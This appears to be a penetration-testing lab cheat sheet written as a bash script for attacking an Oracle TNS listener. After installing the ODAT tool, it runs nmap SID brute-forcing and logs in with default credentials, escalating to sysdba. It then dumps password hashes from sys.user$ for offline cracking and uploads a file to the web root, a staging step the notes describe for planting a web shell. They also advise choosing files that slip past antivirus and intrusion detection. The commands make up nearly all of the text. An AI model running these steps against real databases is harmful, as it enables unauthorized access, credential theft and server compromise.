# Script for setting up tools
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien python3-pip -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
sudo submodule update
sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
# checking if installation is successfull
cd odat
./odat.py -h

# Footprinting
# Scan the default Oracle TNS listener port
sudo nmap -p1521 -sV 10.129.204.235 --open

# Nmap - SID Bruteforcing
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

# odat.py tool is used to perform scans to enumerate and gather information about the Oracle database services and its components. 
# Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. 
./odat.py all -s 10.129.204.235

# SQLplus - Log In to Oracle database (if found valid credentials)
sqlplus scott/tiger@10.129.204.235/XE;
# If you come across the following error sqlplus: error while loading shared libraries: 
# libsqlplus.so: cannot open shared object file: No such file or directory, please execute the below:
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig

# Oracle RDBMS - Interaction
select table_name from all_tables;   # list all available tables in the current database 
select * from user_role_privs;       # show us the privileges of the current user, check if you have administrative privs 
# try using this account to log in as the System Database Admin (sysdba), giving us higher privileges
# Exit back to your shell if using this command:
sqlplus scott/tiger@10.129.204.235/XE as sysdba
# Retrieve the password hashes from the sys.user$ and try to crack them offline.
# Oracle RDBMS - Extract Password Hashes
select name, password from sys.user$;
# Another option would be to upload a web shell to the target but this requires 
# the server to run a web server, and we need to know the exact location of the root directory for the webserver.
# The default paths are:
# Linux 	/var/www/html
# Windows 	C:\inetpub\wwwroot
# Oracle RDBMS - File Upload
# First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important.
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
# test if the file upload approach worked with curl. Therefore, we will use a GET http://<IP> request, or we can visit via browser.
curl -X GET http://10.129.204.235/testing.txt
